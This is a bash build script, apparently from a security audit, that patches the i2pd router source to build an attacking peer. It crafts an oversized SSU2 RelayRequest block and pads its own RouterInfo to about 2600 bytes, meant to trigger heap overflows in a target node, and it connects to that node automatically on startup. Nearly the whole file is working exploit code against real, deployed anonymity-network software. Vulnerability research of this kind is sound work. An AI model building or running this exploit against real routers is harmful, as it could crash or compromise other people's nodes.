#!/bin/bash
# 构建 evil peer —— 从 pristine 构建树复制 + 应用攻击方补丁（目标二进制零改动）
set -e
source /home/z/my-project/audit/env.sh
EVIL=$BUILDS/evil
if [ ! -d $EVIL/libi2pd ]; then
  cp -r $BUILDS/pristine $EVIL
  # 清理 pristine 的产物，保留 .o 以增量编译——注意补丁文件需要重编
fi
cd $EVIL

# ============ Patch 1: SendSessionRequest —— 无条件请求 RelayTag ============
python3 - << 'PYEOF'
import re
p = 'libi2pd/SSU2Session.cpp'
src = open(p).read()

old = """               if (GetRouterStatus () == eRouterStatusFirewalled && m_Address->IsIntroducer ())
                {
                        if (!m_Server.IsMaxNumIntroducers (m_RemoteEndpoint.address ().is_v4 ()) ||
                            m_Server.GetRng ()() & 0x01) // request tag with probability 1/2 if we have enough introducers
                        {"""
new = """               if (getenv ("EVIL_ATTACK") || (GetRouterStatus () == eRouterStatusFirewalled && m_Address->IsIntroducer ()))
                {
                        if (getenv ("EVIL_ATTACK") || !m_Server.IsMaxNumIntroducers (m_RemoteEndpoint.address ().is_v4 ()) ||
                            m_Server.GetRng ()() & 0x01) // request tag with probability 1/2 if we have enough introducers
                        {"""
assert old in src, "patch1 anchor not found"
src = src.replace(old, new)

# ============ Patch 2: Established() —— 延迟发送恶意 RelayRequest ============
old2 = """              if (m_OnEstablished)
                {
                        m_OnEstablished ();
                        m_OnEstablished = nullptr;
                }
        }"""
new2 = """              if (m_OnEstablished)
                {
                        m_OnEstablished ();
                        m_OnEstablished = nullptr;
                }
                // EVIL: 收到 RelayTag 后延迟发送超长 RelayRequest 触发目标堆溢出
                if (getenv ("EVIL_ATTACK") && m_RelayTag && IsOutgoing ())
                {
                        auto s = shared_from_this ();
                        auto timer = std::make_shared<boost::asio::steady_timer> (m_Server.GetService (), std::chrono::seconds (3));
                        timer->async_wait ([s, timer](const boost::system::error_code& ecode)
                                {
                                        if (ecode || !s->IsEstablished ()) return;
                                        uint8_t payload[SSU2_MAX_PACKET_SIZE];
                                        memset (payload, 0, sizeof (payload));
                                        size_t p = 0;
                                        payload[p] = eSSU2BlkRelayRequest; p++;        // type 7
                                        htobe16buf (payload + p, 1437); p += 2;          // size = 1437 > 1440-32-1 → 目标侧下溢
                                        payload[p] = 0; p++;                              // flag
                                        htobe32buf (payload + p, 0x45414545); p += 4;    // nonce
                                        htobe32buf (payload + p, s->m_RelayTag); p += 4; // relayTag
                                        htobe32buf (payload + p, i2p::util::GetSecondsSinceEpoch ()); p += 4; // ts
                                        payload[p] = s->GetRemoteVersion () > 0 ? (uint8_t)s->GetRemoteVersion () : 4; p++; // ver
                                        payload[p] = 0; p++;                              // asz = 0
                                        // 填充 junk 至块尾: 3(头) + 1437 = 1440 整
                                        size_t filled = p;
                                        memset (payload + p, 0x41, 1440 - filled); p = 1440;
                                        LogPrint (eLogWarning, "EVIL: firing malicious RelayRequest block size=1437 tag=", s->m_RelayTag);
                                        s->SendData (payload, p);
                                });
                }
        }"""
assert old2 in src, "patch2 anchor not found"
src = src.replace(old2, new2)
open(p, 'w').write(src)
print("SSU2Session.cpp patched")
PYEOF

# ============ Patch 3: RouterContext::UpdateRouterInfo —— RI 填充至 ~2600B ============
python3 - << 'PYEOF'
p = 'libi2pd/RouterContext.cpp'
src = open(p).read()
old = """       void RouterContext::UpdateRouterInfo ()
        {
                std::shared_ptr<i2p::data::RouterInfo::Buffer> buffer;
                {
                        std::lock_guard<std::mutex> l(m_RouterInfoMutex);
                        m_RouterInfo.CreateBuffer (m_Keys);"""
new = """       void RouterContext::UpdateRouterInfo ()
        {
                std::shared_ptr<i2p::data::RouterInfo::Buffer> buffer;
                {
                        std::lock_guard<std::mutex> l(m_RouterInfoMutex);
                        if (getenv ("EVIL_PAD")) // EVIL: 填充自身 RI 超过 1495B 以触发目标堆溢出
                        {
                                // 先测量无填充长度
                                m_RouterInfo.SetProperty ("evilpad", "");
                                m_RouterInfo.CreateBuffer (m_Keys);
                                size_t base = m_RouterInfo.GetBufferLen ();
                                size_t want = 2600;
                                if (base + 9 < want)
                                        m_RouterInfo.SetProperty ("evilpad", std::string (want - base - 9, 'E'));
                        }
                        m_RouterInfo.CreateBuffer (m_Keys);"""
assert old in src, "patch3 anchor not found"
src = src.replace(old, new)
open(p, 'w').write(src)
print("RouterContext.cpp patched")
PYEOF

# ============ Patch 4: Daemon 启动后主动连接目标 ============
python3 - << 'PYEOF'
p = 'daemon/Daemon.cpp'
src = open(p).read()
old = """               LogPrint(eLogInfo, "Daemon: Starting Router context");
                i2p::context.Start();"""
new = """               LogPrint(eLogInfo, "Daemon: Starting Router context");
                i2p::context.Start();

                if (const char * targetRI = getenv ("EVIL_TARGET_RI")) // EVIL: 主动连接目标
                {
                        std::thread ([targetRI]()
                                {
                                        std::this_thread::sleep_for (std::chrono::seconds (5));
                                        i2p::data::RouterInfo ri (targetRI);
                                        if (ri.IsUnreachable ())
                                        {
                                                LogPrint (eLogError, "EVIL: 目标 RI 无法加载: ", targetRI);
                                                return;
                                        }
                                        auto buf = ri.CopyBuffer ();
                                        LogPrint (eLogWarning, "EVIL: 目标 RI 已加载 ", buf->GetBufferLen (), " bytes, 发起连接");
                                        i2p::data::netdb.AddRouterInfo (buf->data (), buf->GetBufferLen ());
                                        i2p::transport::transports.SendMessage (ri.GetIdentHash (), i2p::CreateDatabaseStoreMsg ());
                                }).detach ();
                }"""
assert old in src, "patch4 anchor not found"
src = src.replace(old, new)
open(p, 'w').write(src)
print("Daemon.cpp patched")
PYEOF

# 增量编译（只有被补丁的文件会重编）
make -j2 USE_UPNP=no CXX=clang++ LDFLAGS="-L$BOOST_LIBRARYDIR" 2>&1 | tail -3
ls -la i2pd && echo "EVIL-BUILD-OK"
